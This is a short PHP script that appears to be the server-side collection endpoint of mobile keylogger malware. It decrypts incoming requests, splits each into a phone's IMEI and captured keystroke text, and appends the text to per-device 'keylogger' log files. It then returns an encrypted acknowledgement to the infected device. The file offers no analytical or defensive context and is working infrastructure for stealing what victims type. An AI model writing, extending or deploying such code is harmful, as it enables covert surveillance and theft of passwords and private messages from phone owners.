<?php
include 'crypt.php';
include 'config.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);
if(strlen($request)>5){
$massivReq = explode("~~~~~~~~~~", $request);
$IMEI_log =  isset($massivReq[0]) ? $massivReq[0] : "";
$text_log =isset($massivReq[1]) ? $massivReq[1] : "";
$data = date('Y-m-d H:i');


if(preg_match('|^[A-Z0-9]+$|i', $IMEI_log)){
  $path_log = "../".namefolder."/application/datalogs/files/keylogger-$IMEI_log-$data.log";
  file_put_contents($path_log, $text_log, FILE_APPEND);
}
$tag = "<tag>";
$otv = encrypt("clear",cryptKey);
$tagend = "</tag>";

echo "$tag$otv$tagend";
}
?>
